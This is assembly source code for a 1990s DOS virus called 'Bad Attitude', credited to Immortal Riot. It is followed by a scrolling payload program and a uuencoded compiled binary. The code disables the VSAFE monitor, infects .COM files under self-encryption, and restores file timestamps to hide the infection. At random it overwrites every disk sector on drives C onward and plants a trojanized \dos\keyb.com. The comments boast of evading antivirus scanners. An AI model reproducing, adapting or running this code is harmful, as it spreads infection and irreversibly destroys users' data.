;                        -Bad Attitude-
;      "Created by Immortal Riot's destructive development team"
;
;        "If I don't have bad attitude, this virus is harmless"
;
; Notes:
;  F-Prot, Scan, Tbav, Findviru can't find shits of this virus.
;
; Disclaimer:
;  If this virus damages you, it's a pleasure, but not the fault 
;  of the author. If you want to sue me, it's your loss.
;
; Dedication:
;  I dedicate this virus to all virus writers worldwide!

.MODEL TINY
.CODE
ORG    100h

Virus_start:
xchg ax,ax                  
xchg ax,ax                 ; Take down VSAFE from memory!
mov  ax,0fa01h                 
mov  dx,5945h
int  16h

call get_delta_offset
real_start:

Get_delta_offset:              ; Get delta offset
pop bp
sub bp, offset get_delta_offset

Call_en_de_crypt:                      
mov ax,bp
add ax,11Ah                     
push ax
jmp short en_de_crypt                  ; First, decrypt the virus
jmp short real_code_start          ; and then, continue!

encryption_value dw 0              ; Random value for each infection!

Write_virus:
call en_de_crypt               ; Encrypt the virus
mov ah,40h
mov cx, offset virus_end-100h
lea dx, [bp+100h]
int 21h
call en_de_crypt               ; Decrypt the virus again
ret

En_de_crypt:
mov ax,word ptr [bp+encryption_value]
lea si,[bp+real_code_start]
mov cx,(virus_end-real_code_start+1)/2

Xor_LoopY:
xor word ptr [si],ax
inc si
inc si
Loop Xor_LoopY
ret

Real_code_start:
mov ah,2ch                 ; Get Time
int 21h
cmp dl,0                   ; 1%
jne Another_Percent            
call Create_file

Another_Percent:
cmp dl,1                   ; another %
jne not_this_time              ; Naaaaaaah

mov ah,09h                 ; Print the virus name
lea dx,[bp+virus]
int 21h

Trash_sucker:                  ; Overwrite all sectors on all drives!
mov al,2h                  ; on drive C - Z
Drive:          
mov cx,1                                             
lea bx,virus            
cwd
Next_Sector:    
int 26h                                                       
inc dx      
jnc next_sector                                                
inc al              
jmp short drive                                             

Not_this_time:
cld
Set_Dta:                   ; Set the dta
mov ah,1ah
lea dx,[bp+virus_end]
int 21h

Buffer_Xfer:                   ; Restore the beginning
lea si,[bp+first_bytes]            
lea di,[bp+@buf]
mov cx,2
rep movsw

mov di,3                   ; Infection-counter

Get_drive:                 ; Get drive from where we're
mov ah,19h                 ; executed from
int 21h

cmp al,2                   
jae Get_Dir                ; A: or B:, if so, don't infect
jmp restore_start              ; other programs! Just return normally!

Get_dir:                   ; Get directory from we're executed
mov ah,47h                 ; from!
xor dl,dl
lea si,[bp+dirbuf+1]
int 21h

Find_First:                ; Find first file
mov cx,111b
lea dx,[bp+filemask]
mov ah,4eh
_4fh:                      ; When called ah=4fh
int 21h

jnc clear_file_attribs             ; We did find a file!

chdir:                     ; We didn't find a file,
cmp byte ptr [bp+DOSflag],1
jne  dot_dott
jmp no_more_files

dot_dott:
mov ah,3bh                 ; so we try in another dir!
lea dx,[bp+offset dot_dot]         
int 21h
jnc find_first 

mov ah,3bh                 ; We try to infect files in
lea dx,[bp+offset DOS]             ; \DOS
int 21h
inc byte ptr [bp+dosflag]

jnc find_first
jmp no_more_files

Clear_file_attribs:            ; Clear file attribs
mov ax,4301h
sub cx,cx
lea dx,[bp+virus_end+1eh]
int 21h

Open_file:                 ; Open the file in read/write mode!
mov ax,3d02h
int 21h
xchg ax,bx

Read_file:                 ; Red the first four bytes of the file
mov ah,3fh
mov cx,4
lea dx,[bp+first_bytes]
int 21h

Check_already_infected:            ; and check if it's already infected

mov si,dx
lea si,[bp+first_bytes]
cmp word ptr [si],0e990h
je already_infected

cmp word ptr [si],5a4dh            ; or an EXE file?
je  already_infected
cmp word ptr [si],4d5ah            ; or an EXE file?
je  already_infected

mov ax,word ptr [bp+virus_end+1ah]     ; or smaller than 400 bytes?  
cmp ax,400
jb already_infected
cmp ax,64000                   ; or bigger than 64000 bytes?
ja already_infected            ; if so, don't infect �m!

Move_file_pointer_2_EOF:

call F_Ptr                 ; Move file-pointer to end of file
sub ax,4                   ; take the last four bytes

Fill_1st_buf:
mov word ptr [bp+Istbuf],0e990h        ; Fill the four bytes
mov word ptr [bp+Istbuf+2],ax          ; with our own jmp-constrution!

_TopOfFile:                ; Move file-pointer to 
mov ax,4200h                   ; the beginning of file!
int 21h

Write_first4:                  ; Write our own jump instruction
mov ah,40h
mov cx,4
lea dx,[bp+Istbuf]
int 21h

_EOF:                      ; Move to end of file again
call F_Ptr

Get_random:                ; Get a random value
mov ah,2ch
int 21h
add dl, dh

jz get_random
mov word ptr [bp+encryption_value],dx  ; put it as the encryption value
call write_virus               ; infect the file

jmp short restore_time_date        ; Then cover our tracks!

Already_infected:
inc di

Restore_Time_Date:             ; Restore the infected file time
lea si,[bp+virus_end+16h]          ; and date stamps
mov cx,word ptr [si]
mov dx,word ptr [si+2]
mov ax,5701h
int 21h

Close_file:                ; Close the file!
mov ah,3eh
int 21h

Set_old_attrib:                    ; Set back old attribs!
mov ax,4301h                    
xor ch,ch                                                          
mov cl,byte ptr [bp+virus_end+15h] 
lea dx,[bp+virus_end+1eh]    
int 21h                                                  

Enough_files:                  ; Have we infected
dec di                     ; 3 files this run?
cmp di,0
je no_more_files

mov ah,4fh                 ; No, then, search for the next file!
jmp _4fh

No_more_files:                 ; We've infected enough!
Restore_start:                 
lea si,[bp+@buf]
mov di,100h
movsw
movsw

Restore_dir:                   ; Restore the directory to
lea dx,[bp+dirbuf]             ; from where we were
mov ah,3bh                 ; executed from!
int 21h

Exit_proc:                 ; and then return to the
mov bx,100h                ; real-file!
push bx
xor ax,ax
retn

F_Ptr:                     ; Move the file-pointer to end of
mov ax,4202h                   ; file! (used twice!)
xor cx, cx
xor dx, dx
int 21h
ret

Create_file:                   ; Create a new \dos\keyb.com
Mov ah,3ch
mov cx,0
lea dx,[bp+filename]
int 21h

Write_Da_File:
xchg ax,bx
mov ah,64d
mov cx,len
lea dx,[bp+scroll]             ; Write new content in the file
int 21h

Close_Da_File:                 ; Close the trojanized file
mov ah,3eh
int 21h
ret                    ; and continue..

scroll db "��$��R��2Ҵ��O��",1ah," �"
scrol1 db " �Q�8",0ffh,"�Y��z�!�{�!�|�!�}�!�~�!��!���!���!� �!���!���!���!���!� �!O�ImmortalRiot "
len      equ $-scroll

virus db '[BAD ATTITUDE!]$'
copy  db "(c) '94 The Unforgiven/Immortal Riot"

Filemask db '*.COM',0         
Dot_dot  db '..',0  
dos      db '\dos',0

filename db '\dos\keyb.com',0
Buffers:        
First_bytes db 90h,90h,50h,0c3h ; Our own little jmp constrution!


@buf        db 4 dup(0)         ; Empty space to be
Istbuf      db 4 dup(0)         ; filled with instructions
DIRBUF      db "\"
Junkie:
           db 64 DUP(0)
dosflag    db 0
virus_end:
end virus_start
; ------------------------------------------------------------------------------
; Here is the nice pay-load (read:scroll) in the Bad Attitude virus.

.model tiny
.code
org    100h
Ssscroll:
mov     al,dl                   
and     al,15

mov     ah,3                    
int     10h
push    dx

mov     dh,al
xor     dl,dl

mov     ah,2
int     10h

mov     di,79
mov     cx,1

arrow:
mov     ax,91Ah

mov     bl,10
int     10h

DELAY:
push    cx
mov     cx,-200
rep     lodsb
pop     cx

mov     ah,2

mov dl, I
int     21h

mov dl, M
int 21h

mov dl, M2
int 21h

mov dl, O
int 21h

mov dl, R
int 21h

mov dl, T
int 21h

mov dl, A
int 21h

mov dl, L
int 21h

Space:
mov dl, ' '
int 21h

mov dl, R2
int 21h

mov dl, I2
int 21h

mov dl, O2
int 21h

mov dl, T2
int 21h

mov dl,' '
int 21h
dec     di
jmp arrow      ; Loop until a ctrl+break is pressed!

heap:
I  db 'I'      ; Immortal Riot
M  db 'm'
M2 db 'm'
o  db 'o'
R  db 'r'
T  db 't'
A  db 'a'
L  db 'l'

R2 db 'R'
I2 db 'i'
O2 DB 'o'
T2 DB 't'      ; Is here to stay!
a13 db ' '         

end Ssscroll

begin 775 badattit.com
MD)"X`?JZ15G-%N@``%V![0T!B\4%&@%0ZQ;K)@``Z`\`M$"YU`*-E@`!S2'H
M`0##BX8<`8VV0@&Y20$Q!$9&XOK#M"S-(8#Z`'4#Z$0!@/H!=1JT"8V6-@/-
M(;`"N0$`NS8#F<]^T.XV6
FC`+@!0RO)C9;R`\TAN`(]S2&3M#^Y
M!`"-EH8#S2&+\HVVA@.!/)#I=$Z!/$U:=$B!/%I-=$*+ANX#/9`!&C@.0Z8F&D`.X`$+-(;1`N00`C9:.`\TAZ%8`M"S-(0+6=/B)
MEAP!Z-W^ZP%'C;;J`XL,BU0"N`%7S2&T/LTAN`%#,NV*CND#C9;R`\TA3X/_
M`'0%M$_I-/^-MHH#OP`!I:6-EI(#M#O-(;L``5,SP,.X`D(SR3/2S2'#M#RY
M``"-EG@#S2&3M$"YAP"0C9:O`LTAM#[-(<.*PB0/M`/-$%**\#+2M`+-$+]/
M`+D!`+@:";,@S1!1N3C_\ZQ9M`**%GH!S2&*%GL!S2&*%GP!S2&*%GT!S2&*
M%GX!S2&*%G\!S2&*%H`!S2&*%H$!S2&R(,TABA:"`<9&]S7&ME>6(N8V]M`)"04,,``````````%P`````````````````````
M````````````````````````````````````````````````````````````
$````````
`
end

